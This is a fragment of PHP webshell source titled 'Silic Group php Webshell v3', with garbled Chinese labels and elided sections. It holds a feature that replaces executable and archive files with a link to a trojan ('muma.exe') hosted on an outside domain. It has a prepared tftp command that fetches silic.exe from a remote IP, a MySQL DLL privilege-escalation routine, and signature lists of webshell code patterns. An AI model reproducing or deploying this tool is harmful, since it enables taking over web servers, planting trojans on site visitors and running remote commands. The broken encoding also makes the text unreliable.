...
<div class="actall" style="height:35px;">ļ <input type="text" name="gt" id="gt" value=".htm|.html|.shtml|.php|.asp" style="width:500px;">
<select onchange='return Fulll(options[selectedIndex].value)'>
...
function showth(th){
	...
	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>غ׺ <input type="text" name="tca" id="tca" value=".exe|.z0|.rar|.zip|.gz|.txt" style="width:500px;"><br><br>滻Ϊ <input type="text" name="tcb" id="tcb" value="http://blackbap.org/muma.exe" style="width:500px;">';
	return true;
}
function autoup(){
...
function Antivirus_e()
{
	...
	$features_php = array('phpһ仰'=>'eval(','php2'=>'->read()','php3'=>'readdir(','ΣMYSQL4'=>'returns string soname','phpܴ5'=>'eval(gzinflate(','phpܴ6'=>'eval(base64_decode(','phpܴ7'=>'base64_decode(','phpһ仰8'=>'eval (','phpϴ9'=>'copy($_FILES','phpϴ10'=>'copy ($_FILES','phpϴ11'=>'move_uploaded_file($_FILES','phpϴ12'=>'move_uploaded_file ($_FILES','phpС13'=>'str_replace(\'\\\\\',\'/\',');
	$features_asx = array('aspС1'=>'·','aspС2'=>'','aspС3'=>'fso.createtextfile(path,true)','aspһ仰4'=>'<%execute(request','aspһ仰5'=>'<%eval request','aspһ仰6'=>'execute session(','aspݿ7'=>'--Created!','asp8'=>'WScript.Shell','asp'=>'<%@ LANGUAGE = VBScript.Encode %>','aspx10'=>'www.rootkit.net.cn','aspx11'=>'Process.GetProcesses','aspx12'=>'lake2');
print<<<END
...
function sFull(i){
	...
	Str[6] = "tftp -i 123.234.222.1 get silic.exe c:\\silic.exe";
...
function Mysql_m()
{
	$MSG_BOX = 'ȵDLLִ.MYSQLûΪrootȨ,·ܼDLLļ.';
	$info = '';
...
print<<<END
<html>
	<title>Silic Group php Webshell v3</title>
	<head>
		<style type="text/css">
			*{padding:0; margin:0;}
